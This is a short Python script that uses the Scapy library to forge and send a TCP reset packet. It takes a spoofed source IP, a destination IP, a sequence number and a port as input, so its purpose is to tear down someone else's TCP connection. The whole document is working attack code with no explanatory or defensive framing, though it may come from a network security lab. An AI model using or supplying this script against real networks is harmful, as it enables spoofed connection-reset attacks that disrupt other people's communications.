from scapy.all import *

src = input("src IP: ")
dst = input("dst IP: ")
ip = IP(src=src, dst=dst)
seqnum = int(input("seq: "))
port = int(input("port: "))
tcp = TCP(sport=port, dport=port, flags="R", seq=seqnum)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
print("RST Sent")
